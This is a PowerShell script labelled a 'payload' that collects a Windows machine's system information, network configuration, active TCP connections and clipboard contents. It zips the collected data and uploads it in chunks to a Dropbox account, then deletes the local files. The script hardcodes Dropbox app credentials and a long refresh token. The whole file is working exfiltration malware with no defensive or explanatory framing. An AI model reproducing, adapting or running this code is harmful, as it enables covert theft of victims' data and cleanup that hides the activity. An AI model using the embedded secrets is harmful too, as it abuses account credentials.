# === Fred Payload Rebuild with Refresh Token Support (Windows Version) ===

# Configuration
$LogFile = "$env:TEMP\fred_debug_log.txt"
$DumpPath = "$env:TEMP\FredDump"
$ZipPath = "$env:TEMP\FredDump.zip"
$DropPath = "/FredDump.zip"
$ChunkSize = 8MB

# Dropbox App Credentials
$ClientId     = "tzee82k8yhrxhep"
$ClientSecret = "uokxh3k5mqccnhp"
$RefreshToken = "sl.u.AFxhYrnu11lmygecddHnnMgkK749AS55LtvYBkrr4N6Z6B6u-iKAObEW2dAGEFu-QEymwyoP2KXvPnT7hiYiHgRO3A2ABA8mU7n9iuaV6kNli0TEIMW9HR1GNd3FJLfwO3dYhUiaeuTH07hG_aF4Xtq5hH0yTcVYexbOT-lAAa7plVIRffIv1zm6Cc0MtASOG1c6xIBn015TXImfKfAGvDL0sVjJthR5dM0tKQzjQgc6NYuP3KTDASaR_m3hBfT5Kd8F-mdXfqYKKTRuJh7DnAgeFkNOmF4_4WgPe1zeh0euOrGQYsLVGfSrXJCXF52aiXl4u3CHEAoVpZ7xgAMzsRoO2OAHRk5L-vVThhjuZzBlmW5MvbXJUchvrPFSUXAi6t5rKlfOOe4vw5qM6jJpjB6Jdy_B06iKjCVNoKShlkrGROEd9S9hnzjOOlpH9e4A-ChyoHuEKdjME95tlynq6Chh5NQmp0a9WHP7Rb8RkqlLaPhY6BhyJfFRN9wOwMj3Rd61lJ4XOzYzCWqNIpA4Ns__jvaGNMc6nhe4gCq8jz-7GGOqBh95Lkxh-Tf4uFiBnAt-wkX64H8DHXgNMYCuN5gnTF2bbZtYW7c6iG2bDsxAUSeuZzR0TXQ3RWH2dLvfRYHXLV-0sazA6Eo_cAnuNvvYEmRNtv5hseneEbQbJNjWRtlZRkyLz8acNKW0_0_15TdA2pQp5ubHt0K7-nPxrm2Fb3SwADNmDdA6xoLiUVaPoQHS_O8qVlV3BktZnMsBUuBsn7pfm5X5T7cn2eIL15giKhCDKsKYcXql4Pz19Y2hEUSSllK0uMuSctyoqEbYwLuVbycOhjgrKjxbTzysnJ47ggMJLsPL_Siyaqs90Wlkn4AK9VCnT_tqJS5WLiO2tl3giM-RHyAHbNCSWtcyDz-7_WqOunz37ZAWlQkuMs8ffISD8U3FNkESECc9Ifbb6JyTbCuq5yofSz-DNg2Oo0GVl5l_TiGhWx1E7zau7bYUlrJh7shS7Y1AWvJe32_C-Q6ZRJb8aKPTrFZxEozxLi_QOFkykpd7z7Z8m26d19xErGASAFHjR3vKRylvja9wKX57oMdnvg5v4xtxqwqIWa0kDXcUwPvpHMIwDLGMFOQYt5ZwRit1l5XZfIVh8e9J5DKpcvWZPCLpBrZdPGbtBjvVtjCcjEzlfQiEr0iY2xLV4HZpBjTpTv5JoLDCl1hhAlRw_gBWHBvlSEd1Fzpj7jik7MwXYStR7QCusB9aHKN28MrChAzIPDnL8KiLmqR8eK3EuBNSYRDYsQw38GNmZAkziKdJvrDtxlYdqzbZEmhNkO682bmcsLRfFL15U_Lr64W6Lboi0lypdxoH0r1VZGIhEI0NTD9Hhf-CoDpCZKFgpyzAyBpUx2duumu3bptNjNiF1fC4_AHc6nXqHjA_a8jVdc9jRggleHtP6jYocEwhnQ"

# Function to get fresh access token
function Get-DropboxAccessToken {
    $basicAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$ClientId`:$ClientSecret"))
    $headers = @{ Authorization = "Basic $basicAuth" }
    $body = @{
        grant_type    = "refresh_token"
        refresh_token = $RefreshToken
    }

    try {
        $res = Invoke-RestMethod -Uri "https://api.dropboxapi.com/oauth2/token" -Method Post -Headers $headers -Body $body
        return $res.access_token
    } catch {
        Write-Host "[ERROR] Failed to retrieve Dropbox access token: $_"
        return $null
    }
}

# Start logging
Start-Transcript -Path $LogFile -Append
Write-Host "[DEBUG] Script started at $(Get-Date)"

$Token = Get-DropboxAccessToken
if (-not $Token) {
    Stop-Transcript
    exit 1
}

# Create dump directory
try {
    New-Item -ItemType Directory -Path $DumpPath -Force | Out-Null
} catch {
    Write-Host "[ERROR] Could not create dump folder: $_"
    Stop-Transcript
    exit 1
}

# Collect system info
try {
    Get-ComputerInfo | Out-File "$DumpPath\systeminfo.txt"
    Get-CimInstance Win32_Processor | Format-List * | Out-File "$DumpPath\cpu.txt"
    Get-CimInstance Win32_OperatingSystem | Select-Object TotalVisibleMemorySize, FreePhysicalMemory | Out-File "$DumpPath\memory.txt"
    Get-PSDrive -PSProvider 'FileSystem' | Out-File "$DumpPath\disk.txt"
    Get-NetIPAddress | Out-File "$DumpPath\network_ip.txt"
    Get-NetRoute | Out-File "$DumpPath\network_routes.txt"
    Get-NetTCPConnection | Out-File "$DumpPath\network_connections.txt"
    try { Get-Clipboard | Out-File "$DumpPath\clipboard.txt" } catch {}
} catch {
    Write-Host "[WARNING] Data collection failed: $_"
}

# Zip the dump folder
try {
    Compress-Archive -Path "$DumpPath\*" -DestinationPath $ZipPath -Force
} catch {
    Write-Host "[ERROR] Compression failed: $_"
    Stop-Transcript
    exit 1
}

# Upload to Dropbox
try {
    $fs = [IO.File]::OpenRead($ZipPath)
    $buffer = New-Object byte[] $ChunkSize
    $fs.Read($buffer, 0, $ChunkSize) | Out-Null

    $headers = @{
        "Authorization"    = "Bearer $Token"
        "Content-Type"     = "application/octet-stream"
        "Dropbox-API-Arg"  = '{"close": false}'
    }

    $res = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/start" -Method Post -Headers $headers -Body $buffer[0..($fs.Position-1)]
    $session = $res.session_id

    while ($fs.Position -lt $fs.Length) {
        $read = $fs.Read($buffer, 0, $ChunkSize)
        $offset = $fs.Position - $read
        $headers = @{
            "Authorization" = "Bearer $Token"
            "Content-Type" = "application/octet-stream"
            "Dropbox-API-Arg" = '{"cursor":{"session_id":"'+$session+'","offset":'+$offset+'},"close":false}'
        }
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/append_v2" -Method Post -Headers $headers -Body $buffer[0..($read-1)]
    }

    $headers = @{
        "Authorization" = "Bearer $Token"
        "Content-Type" = "application/octet-stream"
        "Dropbox-API-Arg" = '{"cursor":{"session_id":"'+$session+'","offset":'+$fs.Length+'},"commit":{"path":"'+$DropPath+'","mode":"overwrite"}}'
    }
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/finish" -Method Post -Headers $headers -Body $null
    $fs.Close()
} catch {
    Write-Host "[ERROR] Upload failed: $_"
    try { $fs.Close() } catch {}
    Stop-Transcript
    exit 1
}

# Cleanup
Remove-Item $ZipPath, $DumpPath -Recurse -Force -ErrorAction SilentlyContinue
Stop-Transcript
